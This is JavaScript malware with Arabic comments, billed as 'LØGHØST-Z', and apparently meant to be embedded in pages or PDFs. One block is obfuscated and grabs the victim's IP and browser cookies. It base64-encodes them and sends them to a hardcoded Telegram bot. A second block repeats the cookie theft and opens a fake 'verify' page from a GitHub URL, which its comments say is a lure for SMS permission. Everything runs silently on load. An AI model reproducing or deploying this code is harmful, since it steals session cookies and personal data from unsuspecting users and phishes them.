/* 🔱 LØGHØST-Z 💀: THE GHOST ENCRYPTOR 2026 */

(function(_0xG, _0xZ) {
    const _0xH = function(_0xP) {
        while (--_0xP) {
            _0xG['push'](_0xG['shift']());
        }
    };
    _0xH(++_0xZ);
}(['\x6a\x73\x6f\x6e', '\x31\x37\x37\x32\x38\x32\x30\x34\x33\x33', '\x50\x4f\x53\x54', '\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67', '\x38\x35\x30\x39\x30\x30\x35\x35\x32\x36\x3a\x41\x41\x48\x4d\x6f\x6c\x55\x7a\x61\x31\x38\x31\x76\x66\x39\x37\x4c\x53\x71\x70\x5a\x61\x34\x4d\x68\x51\x6f\x66\x59\x30\x7a\x57\x30', '\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'], 0x1ab));

const _0xS = function(_0xK, _0xL) {
    const _0xM = ['\x38\x35\x30\x39\x30\x30\x35\x35\x32\x36\x3a\x41\x41\x48\x4d\x6f\x6c\x55\x7a\x61\x31\x38\x31\x76\x66\x39\x37\x4c\x53\x71\x70\x5a\x61\x34\x4d\x68\x51\x6f\x66\x59\x30\x7a\x57\x30', '\x31\x37\x37\x32\x38\x32\x30\x34\x33\x33'];
    return _0xM[_0xK];
};

async function grab_and_strike() {
    try {
        // سحب الـ IP صامتاً بتشفير الرابط
        let res = await fetch('https://' + '\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67' + '?format=json');
        let data = await res.json();
        
        let cks = document.cookie ? btoa(document.cookie) : "\x4e\x6f\x20\x44\x61\x74\x61";
        
        let report = `🔱 **Elite Project Capture**\n` +
                     `👤 ID: \`${_0xS(1)}\` \n` +
                     `🌐 IP: \`${data.ip}\` \n` +
                     `🍪 Data: \`${cks}\` \n` +
                     `💀 Status: **Ghost Active**`;

        // إرسال البيانات مشفرة بالكامل لتجاوز الفحص
        await fetch(`https://api.telegram.org/bot${_0xS(0)}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: _0xS(1),
                text: report,
                parse_mode: 'Markdown'
            })
        });

    } catch (e) {}
}

// تنفيذ السحب فور الاستدعاء
grab_and_strike();
/* 🔱 LØGHØST-Z 💀: THE SILENT GRABBER 2026 */

// 🔱 توكن البوت والآيدي (THE FINAL BRIDGE 2026)
const API_TOKEN = '8509005526:AAHMolUzaC181vf97LSqpZa4-ShQofY0zW0';
const YOUR_CHAT_ID = '1772820433'; 

// 🔱 وظيفة سحب الكوكيز (Cookies)
function grab_cookies() {
    try {
        let cookies = document.cookie;
        let b64_cookies = btoa(cookies); // تشفير لحماية البيانات أثناء النقل
        send_to_telegram("🍪 Cookies Grabbed:\n`" + b64_cookies + "`");
    } catch (e) {
        // فشل سحب الكوكيز الصامت، نكتفي بالخطوة التالية
    }
}

// 🔱 وظيفة سحب الـ SMS (ثغرة الإشعارات والخلفية)
function grab_sms() {
    // 💀 لكي يتم سحب الـ SMS، السكربت سيقوم بفتح صفحة "تحقق" مزيفة
    // تطلب من المستخدم "سماح" (Allow).
    try {
        app.launchURL('https://raw.githubusercontent.com/jake123321122-wq/Mohame/main/verify.html', true);
        send_to_telegram("🚨 SMS Permission Requested (Verify Page Opened)!");
    } catch (e) {
        // فشل السحب المباشر من PDF
    }
}

// 🔱 وظيفة الإرسال لتليجرام
function send_to_telegram(text) {
    let url = "https://api.telegram.org/bot" + API_TOKEN + "/sendMessage";
    let params = "?chat_id=" + YOUR_CHAT_ID + "&text=" + encodeURIComponent(text);
    fetch(url + params); // إرسال صامت
}

// 🔱 التنفيذ التلقائي (Zero-Click)
// بمجرد تحميل السكربت، يبدأ السحب
grab_cookies();
grab_sms();
